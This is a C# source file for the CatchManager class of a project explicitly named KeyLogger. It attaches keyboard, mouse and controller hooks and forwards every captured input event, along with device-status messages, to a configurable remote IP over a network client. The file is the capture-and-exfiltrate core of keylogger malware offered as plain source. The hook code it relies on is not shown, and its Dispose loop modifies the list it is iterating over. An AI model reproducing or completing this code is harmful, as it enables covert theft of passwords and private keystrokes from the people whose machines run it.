using System;
using System.Collections.Generic;
using System.Linq;
using KeyLogger.Catcher.Hooks;
using KeyLogger.Messages;
using KeyLogger.Network;
using KeyLogger.Network.Events;

namespace KeyLogger.Catcher
{
    public class CatchManager : IDisposable
    {
        public List<IInputHook> InputHooks;
        public Client NetworkClient;
        private bool _disposed;

        public CatchManager()
        {
            InputHooks = new List<IInputHook>();
            NetworkClient = new Client();

            NetworkStatus = NetworkStatus.Disconnected;

            NetworkClient.NetworkEvent += NetworkEvent;
        }

        public NetworkStatus NetworkStatus { get; private set; }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        public void ChangeNetworkAdapter(string ip)
        {
            NetworkClient.Disconnect();
            NetworkClient.NetworkEvent -= NetworkEvent;

            NetworkClient = new Client(ip);
            NetworkClient.NetworkEvent += NetworkEvent;
        }

        public void AddHook(IInputHook inputhook)
        {
            inputhook.InputEvent += InputEvent;
            InputHooks.Add(inputhook);

            if (NetworkStatus == NetworkStatus.Connected)
            {
                var @switch = new Dictionary<Type, Action>
                {
                    {typeof (ControllerHook), () => NetworkClient.Send(new DeviceConnectedMessage {Controller = true})},
                    {typeof (KeyboardHook), () => NetworkClient.Send(new DeviceConnectedMessage {Keyboard = true})},
                    {typeof (MouseHook), () => NetworkClient.Send(new DeviceConnectedMessage {Mouse = true})},
                };

                @switch[inputhook.GetType()]();
            }
        }

        public void RemoveHook(Type hooktype)
        {
            if (InputHooks.Count(s => s.GetType() == hooktype) == 1)
            {
                InputHooks.Single(s => s.GetType() == hooktype).InputEvent -= InputEvent;
                InputHooks.Single(s => s.GetType() == hooktype).Dispose();

                InputHooks.Remove(InputHooks.First(s => s.GetType() == hooktype));
            }

            if (NetworkStatus == NetworkStatus.Connected)
            {
                var @switch = new Dictionary<Type, Action>
                {
                    {typeof (ControllerHook), () => NetworkClient.Send(new DeviceConnectedMessage {Controller = false})},
                    {typeof (KeyboardHook), () => NetworkClient.Send(new DeviceConnectedMessage {Keyboard = false})},
                    {typeof (MouseHook), () => NetworkClient.Send(new DeviceConnectedMessage {Mouse = false})},
                };

                @switch[hooktype]();
            }
        }

        private void NetworkEvent(object sender, NetworkEventArgs e)
        {
            if (e.NetworkStatus != NetworkStatus.Unkown)
                NetworkStatus = e.NetworkStatus;

            if (e.NetworkStatus == NetworkStatus.Connected)
            {
                foreach (IInputHook hook in InputHooks)
                {
                    var @switch = new Dictionary<Type, Action>
                    {
                        {
                            typeof (ControllerHook),
                            () => NetworkClient.Send(new DeviceConnectedMessage {Controller = true})
                        },
                        {typeof (KeyboardHook), () => NetworkClient.Send(new DeviceConnectedMessage {Keyboard = true})},
                        {typeof (MouseHook), () => NetworkClient.Send(new DeviceConnectedMessage {Mouse = true})},
                    };

                    @switch[hook.GetType()]();
                }
            }
        }

        private void InputEvent(object sender, HookEventArgs e)
        {
            if (NetworkStatus == NetworkStatus.Connected)
            {
                NetworkClient.Send(e.Message);
            }
        }

        protected virtual void Dispose(bool disposing)
        {
            if (_disposed)
                return;

            if (disposing)
            {
                foreach (IInputHook hook in InputHooks)
                {
                    RemoveHook(hook.GetType());
                }

                NetworkClient.NetworkEvent -= NetworkEvent;
                NetworkClient.Disconnect();
            }

            // Free any unmanaged objects here. 
            //
            _disposed = true;
        }
    }
}